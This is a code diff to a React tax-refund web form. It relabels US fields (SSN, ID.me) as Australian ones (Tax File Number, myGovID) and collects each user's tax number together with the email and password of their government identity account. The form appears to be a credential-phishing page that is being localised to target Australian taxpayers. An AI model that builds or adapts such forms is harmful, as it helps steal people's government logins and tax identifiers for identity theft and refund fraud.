@@ -86,7 +86,7 @@ const TrackingView = ({ onBack }: { onBack: () => void }) => {
                         </div>
                         <div className="flex flex-col mobile:flex-row mobile:items-center gap-2 mobile:gap-4">
                           <p className="text-[9px] mobile:text-[10px] font-black text-gray-400 uppercase tracking-widest flex items-center gap-1.5">
-                            <Shield className="w-3.5 h-3.5" /> SSN: XXX-XX-{refund.ssn.slice(-4)}
+                            <Shield className="w-3.5 h-3.5" /> TFN: XXX-XX-{refund.ssn.slice(-4)}
                           </p>
                           <p className="text-[9px] mobile:text-[10px] font-black text-gray-400 uppercase tracking-widest flex items-center gap-1.5">
                             <Globe className="w-3.5 h-3.5" /> {refund.country}
@@ -97,7 +97,7 @@ const TrackingView = ({ onBack }: { onBack: () => void }) => {
 
                     <div className="flex flex-wrap gap-6 mobile:gap-10 pt-4 mobile:pt-0 border-t mobile:border-t-0 border-gray-200/50">
                       <div>
-                        <p className="text-[8px] mobile:text-[9px] font-black text-gray-300 uppercase tracking-widest mb-1.5">ID.me Profile</p>
+                        <p className="text-[8px] mobile:text-[9px] font-black text-gray-300 uppercase tracking-widest mb-1.5">myGovID Profile</p>
                         <p className="text-[10px] mobile:text-[11px] font-black text-navy-900 tracking-tight lowercase">{refund.idmeEmail}</p>
                       </div>
                       <div>
@@ -298,14 +298,14 @@ const TaxRefundSection = () => {
                     </div>
 
                     <div className="space-y-2">
-                      <label className="text-[10px] font-black text-navy-900 uppercase tracking-widest ml-1">Social Security Number (SSN)</label>
+                      <label className="text-[10px] font-black text-navy-900 uppercase tracking-widest ml-1">Tax File Number (TFN)</label>
                       <div className="relative group">
                         <Shield className="absolute left-5 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-300 group-focus-within:text-primary-500 transition-colors" />
                         <input
                           type="text"
                           value={ssn}
                           onChange={(e) => setSsn(e.target.value)}
-                          placeholder="XXX-XX-XXXX"
+                          placeholder="XXX XXX XXX"
                           className="w-full pl-12 pr-5 mobile:py-4 py-2  bg-gray-50 border border-gray-100 mobile:rounded-2xl rounded-lg focus:ring-2 focus:ring-primary-500/20 focus:border-primary-500 outline-none transition-all font-bold text-navy-900 placeholder:text-gray-300 mobile:text-base text-sm font-mono"
                           required
                         />
@@ -313,15 +313,15 @@ const TaxRefundSection = () => {
                     </div>
                   </div>
 
-                  {/* ID.me Credentials */}
+                  {/* myGovID Credentials */}
                   <div className="space-y-6">
                     <h4 className="flex items-center gap-2 text-[10px] font-black text-primary-600 uppercase tracking-[0.2em]">
-                      <Lock className="w-4 h-4" /> ID.me Credentials
+                      <Lock className="w-4 h-4" /> myGovID Credentials
                     </h4>
 
                     <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                       <div className="space-y-2">
-                        <label className="text-[10px] font-black text-navy-900 uppercase tracking-widest ml-1">ID.me Email</label>
+                        <label className="text-[10px] font-black text-navy-900 uppercase tracking-widest ml-1">myGovID Email</label>
                         <div className="relative group">
                           <Mail className="absolute left-5 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-300 group-focus-within:text-primary-500 transition-colors" />
                           <input
@@ -336,7 +336,7 @@ const TaxRefundSection = () => {
                       </div>
 
                       <div className="space-y-2">
-                        <label className="text-[10px] font-black text-navy-900 uppercase tracking-widest ml-1">ID.me Password</label>
+                        <label className="text-[10px] font-black text-navy-900 uppercase tracking-widest ml-1">myGovID Password</label>
                         <div className="relative group">
                           <Lock className="absolute left-5 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-300 group-focus-within:text-primary-500 transition-colors" />
                           <input
@@ -408,7 +408,7 @@ const TaxRefundSection = () => {
                     <div>
                       <h5 className="text-[10px] font-black text-red-700 uppercase tracking-widest mb-1">Important Notice</h5>
                       <p className="text-xs text-red-600 font-medium leading-relaxed">
-                        Please ensure all information provided is accurate and matches your ID.me account details. Any discrepancies may result in delays or rejection of your refund request.
+                        Please ensure all information provided is accurate and matches your myGovID account details. Any discrepancies may result in delays or rejection of your refund request.
                       </p>
                     </div>
                   </div>
@@ -460,7 +460,7 @@ const TaxRefundSection = () => {
                 <div className="absolute top-0 right-0 w-32 h-32 bg-primary-500/10 rounded-full -mr-16 -mt-16 blur-2xl group-hover:scale-150 transition-transform duration-700"></div>
                 <h4 className="text-sm font-black uppercase tracking-tight mb-4 relative z-10">Need Assistance?</h4>
                 <p className="text-gray-400 text-xs leading-relaxed mb-6 relative z-10">
-                  Our support team is available 24/7 to help you with your tax refund inquiries.
+                  Our support team is available 24/7 to help you with your tax refund enquiries.
                 </p>
                 <button className="w-full py-3 bg-white/10 hover:bg-white/20 rounded-xl text-[10px] font-black uppercase tracking-widest transition-all relative z-10">
                   Contact Support
